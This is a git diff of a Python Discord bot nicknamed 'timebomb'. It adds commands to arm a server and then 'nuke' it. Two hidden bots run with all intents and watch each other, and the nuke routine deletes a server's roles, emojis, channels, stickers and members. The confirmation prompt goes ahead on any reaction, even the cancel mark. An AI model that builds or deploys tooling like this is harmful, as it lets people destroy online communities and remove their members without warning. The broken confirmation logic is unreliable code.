@@ -7,18 +7,29 @@ import asyncio
 import json
 import logging
 import os
-from typing import Optional, List, Tuple, Type
+from typing import Optional, List, Tuple, Type, Union
 
 import discord
 from discord.ext import commands
 
 loop: asyncio.AbstractEventLoop = asyncio.get_event_loop()
+nukables: List[int] = []  # A list of servers that can be nuked. TODO: put this on a database?
+watched_ids: List[int] = [
+    int(id_to_watch)
+    for id_to_watch
+    in (
+        os.environ["OTHER_WATCHING_IDS"].split(", ")
+        if os.environ.get("OTHER_WATCHING_IDS") is not None
+        else []
+    )
+]
 
 timebomb: commands.Bot = commands.Bot(
     command_prefix=os.environ.get("COMMAND_PREFIX", ">"),
     description="The clock is ticking. Do you choose to advance it?",
     loop=loop,
     status=discord.Status.offline,
+    intents=discord.Intents.all(),
 )  # The first bot. Watches the second bot.
 
 bombtime: commands.Bot = commands.Bot(
@@ -26,6 +37,7 @@ bombtime: commands.Bot = commands.Bot(
     description="The clock is ticking. Do you choose to advance it?",
     loop=loop,
     status=discord.Status.offline,
+    intents=discord.Intents.all(),
 )  # The first bot. Watches the second bot.
 
 
@@ -79,7 +91,6 @@ async def nuke_channels(guild: discord.Guild) -> Tuple[int, int]:  # Fails & cha
         else:
             channels += 1
     return fails, channels
-
 
 
 async def nuke_roles(guild: discord.Guild) -> Tuple[int, int]:  # Fails & roles deleted
@@ -137,22 +148,29 @@ async def nuke(bot: commands.Bot, guild: discord.Guild) -> None:
         )
 
     logging.info(
-            f"Nuked {guild.name} ({guild.id}). "
-            f"Casualties: {roles} role(s), "
-            f"{emojis} emoji(s), "
-            f"{channels} channel(s), "
-            f"{stickers} stickers(s), "
-            f"and {members} member(s). "
-            f"Unable to delete {fails} models."
+        f"Nuked {guild.name} ({guild.id}). "
+        f"Casualties: {roles} role(s), "
+        f"{emojis} emoji(s), "
+        f"{channels} channel(s), "
+        f"{stickers} stickers(s), "
+        f"and {members} member(s). "
+        f"Unable to delete {fails} models."
     )
 
 
-async def evaluate_nuclear_action(intruder: discord.Member, guild: discord.Guild) -> bool:
-    pass  # TODO: See if a server can be nuked. Return a bool.
+async def evaluate_nuclear_action(bot: Union[commands.Bot, commands.Context],
+                                  guild: Optional[discord.Guild] = None) -> bool:
+    if isinstance(bot, commands.Context):
+        guild: discord.Guild = bot.guild
+        bot: commands.Bot = bot.bot
+    return guild.id in nukables
 
 
 class TickTick(commands.Cog):
     """The main cog. Handles all functions."""
+    def __init__(self, bot: commands.Bot) -> None:
+        self.bot = bot
+
     async def cog_check(self, ctx: commands.Context) -> bool:
         if await ctx.bot.is_owner(ctx.author):
             return True
@@ -161,21 +179,54 @@ class TickTick(commands.Cog):
 
     # TODO: See if a server has done something that might be nukable.
 
+    @commands.Cog.listener("on_ready")
+    async def initialize_watching_users(self):
+        watched_ids.append(self.bot.user.id)
+
     @commands.command("arm", brief="Puts the server on watch. Nuking is possible.")
     @commands.guild_only()
     async def arm(self, ctx: commands.Context, *, guild: Optional[discord.Guild]) -> None:
         guild: discord.Guild = guild or ctx.guild
-        pass  # TODO: Add the server to the nukable list.
+        if guild.id not in nukables:
+            nukables.append(guild.id)
+        await ctx.send("T-Minus as long as it takes.")
+
+    @commands.command("nuke", brief="Pull the trigger.")
+    @commands.guild_only()
+    @commands.check(evaluate_nuclear_action)
+    async def nuke(self, ctx: commands.Context, *, guild: Optional[discord.Guild]) -> None:
+        guild: discord.Guild = guild or ctx.guild
+        message: discord.Message = await ctx.send(f"And so it begins. Continue?")
+        await message.add_reaction(emoji="\U00002705")
+        await message.add_reaction(emoji="\U0000274c")
+
+        def checkForReaction(reaction_object: discord.Reaction, user: Union[discord.Member, discord.User]):
+            return (user.id == ctx.author.id) \
+                   and (reaction_object.message == message) \
+                   and (str(reaction_object.emoji) in ["\U00002705", "\U0000274c"])
+
+        try:
+            reaction: discord.Reaction = await ctx.bot.wait_for(event="reaction_add", check=checkForReaction,
+                                                                timeout=20.0)
+        except asyncio.TimeoutError:
+            await message.clear_reaction(emoji="\U00002705")
+            await message.clear_reaction(emoji="\U0000274c")
+            await message.edit(content="Command timed out.")
+            return
+        else:
+            await nuke(ctx.bot, guild)
 
     @commands.command("disarm", brief="Removes the server from watch. Nuking is not possible.")
     @commands.guild_only()
+    @commands.check(evaluate_nuclear_action)
     async def disarm(self, ctx: commands.Context, *, guild: Optional[discord.Guild]) -> None:
         guild: discord.Guild = guild or ctx.guild
-        pass  # TODO: Remove the server from the nukable list
+        nukables.remove(guild.id)
+        await ctx.send("It's over. For now.")
 
 
-timebomb.add_cog(TickTick())
-bombtime.add_cog(TickTick())
+timebomb.add_cog(TickTick(timebomb))
+bombtime.add_cog(TickTick(bombtime))
 
 if __name__ == "__main__":
     logging.basicConfig(
